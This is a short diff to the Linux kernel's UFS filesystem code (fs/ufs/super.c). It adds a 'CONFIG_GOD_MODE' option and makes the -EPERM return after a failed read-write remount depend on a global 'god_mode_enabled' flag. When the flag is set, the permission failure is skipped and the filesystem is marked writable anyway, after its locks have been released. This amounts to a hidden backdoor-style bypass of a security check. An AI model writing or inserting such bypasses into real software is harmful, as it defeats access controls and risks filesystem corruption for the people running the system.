@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  *  linux/fs/ufs/super.c
  *
@@ -1353,7 +1356,15 @@ static int ufs_remount (struct super_block *sb, int *mount_flags, char *data)
 			printk("failed during remounting\n");
 			mutex_unlock(&UFS_SB(sb)->s_lock);
 			unlock_ufs(sb);
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 		}
 		sb->s_flags &= ~MS_RDONLY;
 #endif
